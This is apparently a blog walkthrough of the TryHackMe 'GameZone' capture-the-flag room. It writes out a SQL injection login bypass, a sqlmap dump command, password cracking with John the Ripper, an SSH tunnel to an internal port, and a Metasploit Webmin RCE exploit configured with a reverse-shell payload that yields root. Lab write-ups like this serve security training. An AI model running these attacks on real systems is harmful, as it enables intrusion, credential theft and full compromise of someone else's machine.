This is a walkthrough for the [TryHackMe][thm] room: [GameZone][gz]. Let’s get started!

# Deploy the Machine
Deploy the machine and verify access through the website. Right away, we can answer our first question. You can do a reverse image search on the image they describe for the first answer, or if you know what game the character is from you can Google the name!

# Obtain access via SQLi
This task is pretty simple. Let’s just follow along.

Enter `' or 1=1 -- -` as our username and leave the password blank. We get redirected to a page and that is our answer!

# Using SQLMap
Here we are going to use SQLMap to exploit this form on the “Game Zone Portal” page.

Let’s start BurpSuite in order to intercept a request. Make sure you have your proxy turned on and intercept on, then enter anything into the search field.

Let’s copy that request into a `.txt` file so we can pass it into SQLMap later.

We can now format our SQLMap command:

`sqlmap -r request.txt --dbms=mysql --dump`

Run that command and SQLMap will begin testing different methods.

Once complete, we see the output of two tables. We can grab the next 3 answers from this output.

# Cracking a password with JohnTheRipper
Make sure to copy the hash to a file, so we can run JohnTheRipper against it.

The format for JohnTheRipper is the following:

```bash
john hash.txt --wordlist=$PATH/rockyou.txt --format=Raw-SHA256
```
Run this and we get our de-hashed password!

Now ssh into the machine and find the user flag!

# Exposing Services with Reverse SSH Tunnels
Now let’s run ss to get socket information. Run the following on the victim machine:

`ss -tulpn`

We need to expose port 10000 to us. We can run the following command in a new terminal window on our local machine:

`ssh -L 10000:localhost:10000 <username>@<victim_ip>`

From here we can open up a new browser tab and navigate to `localhost:10000`

**NOTE:** Make sure to turn your BurpSuite proxy off if the page isn’t loading!

Login with our already known credentials to get the CMS version.

# Privilege Escalation with Metasploit
We can load up Metasploit on our attack machine (`msfconsole`) and search for an exploit:

`search webmin 1.58`

We find a Remote Code Execution (RCE) exploit! Let’s try that.

![g7](/static/img/thm/gz/g7.webp)

```bash
use 1
options
set rhosts localhost
set username <username>
set password <password>
set ssl false
set lhost tun0
show payloads
set payload cmd/unix/reverse
run
```
The session was created in the background, so lets open it: `sessions 1`

`whoami`
`cat /root/root.txt`

# Review
That was a really fun room! It covered SQL injection, hash cracking, reverse SSH tunnels, and metasploit! I really enjoyed this room. Granted, it was easy and walked you through most of it, but we still learned a lot in the process!
